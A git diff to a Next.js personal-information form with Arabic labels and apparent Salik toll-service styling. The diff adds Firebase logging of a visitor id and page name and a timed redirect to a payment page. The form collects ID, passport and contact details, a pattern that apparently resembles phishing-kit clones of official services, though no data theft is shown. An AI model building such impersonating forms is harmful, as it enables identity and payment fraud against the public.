@@ -1,16 +1,18 @@
 "use client"
 
 import type React from "react"
-
 import { useState } from "react"
 import { useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { User, CreditCard, Phone, Flag, StampIcon as Passport, Calendar, Mail } from "lucide-react"
+import { User, CreditCard, Phone, Flag, StampIcon as Passport, Calendar, Mail, Loader } from "lucide-react"
+import { addData } from "@/lib/firebase"
+import FullPageLoader from "./full-page-loader"
 
 export function PersonalInfoForm() {
   const router = useRouter()
+  const [loading,setLoading]=useState(false)
   const [formData, setFormData] = useState({
     fullName: "",
     idNumber: "",
@@ -20,12 +22,23 @@ export function PersonalInfoForm() {
     birthDate: "",
     email: "",
   })
-
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
-    router.push("/payment")
+    setLoading(true)
+   const _id= localStorage.getItem("vistor")
+    addData({
+      id: _id,
+      page:'معلومات',
+      createdDate:new Date().toDateString()
+    })
+    setTimeout(() => {
+      router.push('/payment')
+    setLoading(false)
+
+    }, 3000);
   }
 
+ 
   return (
     <form onSubmit={handleSubmit} className="space-y-6">
       <div className="space-y-4">
@@ -130,7 +143,7 @@ export function PersonalInfoForm() {
       <Button type="submit" className="w-full salik-button-secondary py-4">
         أستمرار
       </Button>
+      {loading&& <FullPageLoader/>}
     </form>
   )
 }
-
